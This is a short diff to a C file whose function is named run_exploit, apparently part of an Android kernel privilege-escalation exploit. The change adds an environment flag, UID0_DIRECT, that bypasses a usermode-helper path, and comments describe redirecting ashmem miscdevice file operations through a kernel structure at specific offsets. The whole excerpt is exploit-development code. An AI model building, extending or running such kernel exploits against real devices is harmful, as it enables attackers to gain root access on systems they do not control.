@@ -3161,7 +3161,8 @@ int run_exploit(int argc, char **argv) {
     return landed ? 0 : 1;
   }
 
-  if (!selinux_ok && umh_available && !force_w1) {
+  if (!selinux_ok && umh_available && !force_w1 &&
+      !env_flag("UID0_DIRECT", 0)) {
     /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
      * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
      * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
